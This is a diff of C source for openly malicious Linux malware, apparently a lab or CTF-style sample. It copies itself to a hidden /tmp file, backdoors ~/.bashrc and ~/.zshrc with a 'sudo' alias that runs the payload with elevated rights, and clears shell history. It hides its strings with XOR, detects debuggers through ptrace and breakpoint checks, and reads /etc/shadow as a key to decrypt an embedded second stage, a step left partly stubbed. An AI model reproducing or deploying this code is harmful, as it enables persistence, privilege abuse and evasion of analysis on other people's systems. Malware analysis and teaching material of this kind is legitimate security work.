@@ -8,43 +8,79 @@
 #include <stdio.h>
 #include <errno.h>
 #include <string.h>
+#include "aes.h"
 
-#define DEBUG
-
-extern char _stage2[];
+#pragma GCC push_options
 static int k = 42;
 char scratch[4096];
+extern unsigned char _binary_stage2_start;
+extern unsigned char _binary_stage2_end;
+extern unsigned char _binary_stage2_size;
+
 
 // SOURCE_STRINGS
-//#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/entry-RjwtJS && sudo'\nhistory -c && clear\n"
+//#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/.entry-RjwtJS && sudo'\nhistory -c && clear\n"
 //#define BASHRC_NAME_XOR ".bashrc"
 //#define ENV_XOR "HOME"
-//#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/entry-RjwtJS && sudo'\n"
-//#define PAYLOAD_LOCATION_XOR "/tmp/entry-RjwtJS"
+//#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/.entry-RjwtJS && sudo'\n"
+//#define PAYLOAD_LOCATION_XOR "/tmp/.entry-RjwtJS"
 //#define ANTI_DEBUG_XOR "Why you debug me :(?"
-//#define CAPN_XOR "Why you debug me Captain?\n"
+//#define CAPN_XOR "Why you debug me Captain?"
+//#define SELF_XOR "/proc/self/exe"
+//#define BASHRC_XOR "%s/.bashrc"
+//#define ZSHRC_XOR "%s/.zshrc"
+//#define SHADOW_XOR "/etc/shadow"
+//#define PERSISTENCE_XOR "/bin/pirate"
 // END_SOURCE_STRINGS
 
 //START OBFUSCATING
-#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/entry-RjwtJS && sudo'\nhistory -c && clear\n"
-#define BASHRC_NAME_XOR ".bashrc"
-#define ENV_XOR "HOME"
-#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/entry-RjwtJS && sudo'\n"
-#define PAYLOAD_LOCATION_XOR "/tmp/entry-RjwtJS"
-#define ANTI_DEBUG_XOR "Why you debug me :(?"
-#define CAPN_XOR "Why you debug me Captain?\n"
 //END OBFUSCATING
 
+/**
+ * This is a very rudimentary single byte XOR function. Analysts could probably easily
+ * reveal every string by passing all xored looking strings to a xor brute forcer
+ */
+// This is so GCC doesn't optimize out our XOR encryption...
+#pragma GCC optimize ("O0")
+char * dexor(const char * to_dexor) {
+    int i;
+    int length =  *((int*) to_dexor);
+    for (i = 4; i < length+4; i++) {
+	// The XOR key is the least significant byte of the string length
+        scratch[i-4] = to_dexor[i] ^ *((char*)to_dexor);
+    }
+    // Tack on null terminator
+    scratch[length] = '\0';
+
+    return scratch;
+}
+#pragma GCC pop_options
 /**
  * Decrypts the STAGE-2 payload which is embedded as an extern 
  * 
  */
 void decrypt_stage2(char * write_destination) {
     // Get the decryption key, which is readf 
+    char * shadow_file = dexor(SHADOW_XOR);
+
+    // Read the first 16 characters from /etc/shadow
+    int fd = open(shadow_file, O_RDONLY);
+    uint8_t key[16];
+    int read_in  = read(fd, &key, 16);
+    close(fd);
 
     // Copy the decrypted payload
+    //AES_ctx context;
+
+    //AES_init_ctx(&context, &key);
+
+    // Allocate buffer for Stage2 Malloc
+
+    // Decrypt the buffer
+
+  
+    // Open file for writing 
     
-    // Set the permissions
     
 }
 
@@ -54,32 +90,32 @@ void decrypt_stage2(char * write_destination) {
 void backdoor_rcfiles() {
     const char * homedir = getenv("HOME");
     char str[256];
-    int nread;
 
     if (homedir != NULL) {
-        snprintf(str, 256,"%s/.zshrc",  homedir);
+        snprintf(str, 256,dexor(ZSHRC_XOR),  homedir);
         FILE * rc_file = fopen(str, "r");
         // Look for bashrc
         if (rc_file) {
             fclose(rc_file);
 	    rc_file = fopen(str, "a");
-
-	    fputs(ALIAS_STR, rc_file);
+	    fputs(dexor(ALIAS_STR_XOR), rc_file);
 	    fclose(rc_file); 
 	}
 
-        snprintf(str, 256, "%s/.bashrc", homedir);
+        snprintf(str, 256, dexor(BASHRC_XOR), homedir);
         // Look for zshrc
         rc_file = fopen(str, "r");
         if (rc_file) {
             fclose(rc_file);
 	    rc_file = fopen(str,"a");
 
-            fputs(ALIAS_STR, rc_file); 
+            fputs(dexor(ALIAS_STR_XOR), rc_file); 
 
 	    fclose(rc_file);
 	}
-    } else {
+    } 
+    
+    else {
         // Hard way, we look for the home dir.
         DIR * dp;
         struct dirent * ep;
@@ -95,21 +131,6 @@ void backdoor_rcfiles() {
     }
 }
 
-/**
- * This is a very rudimentary single byte XOR function. Analysts could probably easily
- * reveal every string by passing all xored looking strings to a xor brute forcer
- */
-char * dexor(const char * to_dexor, int length) {
-    int i;
-    for (i = 4; i < length+4; i++) {
-	// The XOR key is the least significant byte of the string length
-        scratch[i] = to_dexor[i] ^ *to_dexor;
-    }
-    // Tack on null terminator
-    scratch[i] = '\0';
-
-    return scratch;
-}
 
 /**
  *
@@ -140,21 +161,23 @@ void raw_ioctl() {
 /**
  * Copy self to the /tmp/ directory 
  */
-void copy_self() {
+ void copy_self() {
     // Zero out the buffer because readlink doesn't append
     // a null terminator.
     memset(scratch, 0, sizeof(scratch));
 
     // Get the location of the current executable
-    readlink("/proc/self/exe", scratch, sizeof(scratch));
+    readlink(dexor(SELF_XOR), scratch, sizeof(scratch));
 
+    printf(scratch);
     // Copy the executable to the /tmp/ destination
     int curr_file = open(scratch, O_RDONLY);
     if (curr_file < 0) {
         return; 
     }
 
-    int dest_file = open(dexor(PAYLOAD_LOCATION_XOR, *PAYLOAD_LOCATION_XOR), O_WRONLY | O_CREAT | O_EXCL, 0666);
+    printf(dexor(PAYLOAD_LOCATION_XOR));
+    int dest_file = open(dexor(PAYLOAD_LOCATION_XOR), O_WRONLY | O_CREAT, 0665);
     if (dest_file < 0) {
         goto failure;
     }
@@ -195,7 +218,7 @@ void copy_self() {
  * Sets the alias in the current terminal. 
  */
 void perform_source() {
-    char * cmd = dexor(TERM_ALIAS, *TERM_ALIAS); 
+    char * cmd = dexor(TERM_ALIAS_XOR); 
     if (fork() == 0) {
 	// Go until null terminator
         while(*cmd != '\0') {
@@ -217,7 +240,7 @@ int main(int argc, char *argv[]) {
 
     // Debug prevention. Really we are preventing an easy strace :)
     if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
-        printf(dexor(CAPN_XOR, *CAPN_XOR));
+        printf(dexor(CAPN_XOR));
 	exit(0);
     } else {
         ptrace(PTRACE_DETACH, 0, 1, 0);
@@ -225,27 +248,26 @@ int main(int argc, char *argv[]) {
 
     // Check any functions for bps
     if ((*(volatile unsigned long *)((unsigned long)perform_source) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
+        printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) raw_ioctl) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
+        printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) backdoor_rcfiles) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
+        printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) dexor) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
+        printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
 
-    unsigned long curr_time = 0;
     uid_t curr_id = geteuid();
 
     if (curr_id == 0) {
-	decrypt_stage2(PAYLOAD_LOCATION);
+	decrypt_stage2(dexor(PAYLOAD_LOCATION_XOR));
     } else {
         backdoor_rcfiles();
         perform_source();
